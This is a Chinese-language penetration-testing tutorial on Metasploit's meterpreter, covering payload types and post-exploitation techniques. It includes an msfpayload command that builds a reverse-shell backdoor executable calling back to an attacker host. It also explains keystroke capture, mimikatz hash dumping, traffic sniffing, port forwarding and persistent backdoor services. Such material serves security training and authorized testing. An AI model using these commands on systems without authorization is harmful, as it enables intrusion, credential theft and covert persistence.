# metasploit 渗透测试笔记(meterpreter篇)

0x01 背景
-------

* * *

meterpreter作为后渗透模块有多种类型，并且命令由核心命令和扩展库命令组成，极大的丰富了攻击方式。 需要说明的是meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况，别担心结束了之后再来一次，喝杯茶就好了。

0x02 常用类型
---------

* * *

### reverse_tcp

path : payload/windows/meterpreter/reverse_tcp

```
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.130 LPORT=8080 X > ～/Desktop/backdoor.exe

```

![enter image description here](http://drops.javaweb.org/uploads/images/5f68b3abb5316ddd9ba6cf0366c37b94c08e2d1a.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/633e67d29988988d2b2d04ff4330ec4b3029ccdd.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/8e7bb3e135505c47ae716a13cb8e54551833977d.jpg)

反向连接shell,使用起来很稳定。需要设置LHOST。

### bind_tcp

path : payload/windows/meterpreter/bind_tcp

正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。

### reverse_http/https

path:`payload/windows/meterpreter/reverse_http/https`

通过http/https的方式反向连接，在网速慢的情况下不稳定，在某博客上看到https如果反弹没有收到数据，可以将监听端口换成443试试。

0x03 基本命令
---------

* * *

![enter image description here](http://drops.javaweb.org/uploads/images/65842b41416332f54633132aa90732a9ec95df0a.jpg)

常用的有

```
background：将当前会话放置后台
load/use：加载模块
Interact：切换进一个信道
migrate：迁移进程
run：执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等。
Resource：执行一个已有的rc脚本。

```

0x04 常用扩展库介绍
------------

* * *

![enter image description here](http://drops.javaweb.org/uploads/images/2e08bf5a0474e83a5ae13a3d43ca2af24ba28b78.jpg)

meterpreter中不仅有基本命令还有很多扩展库，load/use之后再输入help，就可以看到关于这个模块的命令说明了。

stdapi command
--------------

### 文件相关

stdapi中有关于文件读写，上传下载，目录切换，截屏，摄像头，键盘记录，和系统相关的命令。 常用的当然就是文件操作及网络有关的命令。 通常我会用upload和download进行文件上传和下载，注意在meterpreter中也可以切换目录，当然也可以编辑文件。所以就不用运行shell再用echo写。

![enter image description here](http://drops.javaweb.org/uploads/images/22eb166125aa9e5db2b1c2826eb5a0a4809d8daf.jpg)

使用edit命令时需要注意编辑的是一个存在的文件，edit不能新建文件。 输入edit + 文件后就会调用vi编辑了。

![enter image description here](http://drops.javaweb.org/uploads/images/e94cf4844452335240617b3b81d78faa0f51f2c0.jpg)

### 网络相关

网络命令则有列出ip信息(ipconfig),展示修改路由表(route),还有端口转发(portfwd)。 比如portfwd：

![enter image description here](http://drops.javaweb.org/uploads/images/67dd63a15cff89f74c03e2d4ba97ac0926d4ddc3.jpg)

在建立规则之后就可以连接本地3344端口，这样远程的3389端口就转发出来了。

### 键盘监听

![enter image description here](http://drops.javaweb.org/uploads/images/ce766b5fc19fbe985913a30ae1327685887de6de.jpg)

这里需要注意一下windows会话窗口的概念，windows桌面划分为不同的会话(session)，以便于与windows交互。会话0代表控制台，1，2代表远程桌面。所以要截获键盘输入必须在0中进行。可 以使用getdesktop查看或者截张图试试。否则使用setdesktop切换。

![enter image description here](http://drops.javaweb.org/uploads/images/79ee07a061116efdf8b00caac89b059e5d091861.jpg)

如果不行就切换到explorer.exe进程中，这样也可以监听到远程桌面连接进来之后的键盘输入数据。

### mimikatz

这个不多介绍，只是因为这样抓到的hash可以存进数据库方便之后调用，不知道有没有什么方法可以快速的用第三方工具抓到hash/明文然后存进数据库。

![enter image description here](http://drops.javaweb.org/uploads/images/d25c86671f29e72eccd606d3a90321aa5a2ff1e8.jpg)

这里是因为我的用户本身就没有密码。

### sniffer

![enter image description here](http://drops.javaweb.org/uploads/images/7c0ce79d937c1ec0c42f1673a2d9c9b7299c5d42.jpg)

就是不知道能不能把包保存在victim上，然后后期再下下来，待实战考证。

0x05使用自定脚本
----------

* * *

这里的脚本可以是rc脚本，也可以是ruby脚本，metasploit已经有很多自定义脚本了。比如上面说过的arp_scanner,hashdump。这些脚本都是用ruby编写，所以对于后期自定义修改来说非常方便，这里介绍一个很常见的脚本scraper，它将目标机器上的常见信息收集起来然后下载保存在本地。推荐这个脚本是因为这个过程非常不错。可以加入自定义的命令等等。

![enter image description here](http://drops.javaweb.org/uploads/images/fe45a61371b1799c295ccbe097584a42e53cf5fa.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/2a18205deb0e6895632653cf58e723567138f534.jpg)

`/.msf4/logs/`下保存了所有脚本需要保存的日志记录，当然不只这一个脚本。同样.msf4文件夹下还保存了其他东西，比如输入过的命令，msf运行过程的日志等。 Scraper脚本将保存结果在`/.msf4/logs/scripts/scraper/`下。

0x06 持续性后门
----------

* * *

metasploit自带的后门有两种方式启动的，一种是通过服务启动(metsvc)，一种是通过启动项启动(persistence) 优缺点各异:metsvc是通过服务启动，但是服务名是meterpreter,脚本代码见图，

![enter image description here](http://drops.javaweb.org/uploads/images/2178691b12f190e88cc1fb55770a4376c20c15aa.jpg)

这里需要上传三个文件，然后用metsvc.exe 安装服务。不知道服务名能不能通过修改metsvc.exe达到。 安装过程和回连过程都很简单

![enter image description here](http://drops.javaweb.org/uploads/images/d650b50c9b5121aeaa62f7df0d5b9faef75d2aa9.jpg)

下次回连时使用windows/metsvc_bind_tcp的payload就可以。

![enter image description here](http://drops.javaweb.org/uploads/images/5907af099e580dfd9ba70b5571d950c58d938385.jpg)

0x07 后记
-------

* * *

meterpreter提供了很多攻击或收集信息的脚本，并且还有很多API(具体参考官方文档)，及扩展。在对ruby代码理解的程度上，如果能根据目标环境和现状修改现有脚本或编写自己的脚本则能够极大的提高效率，获得预期的结果。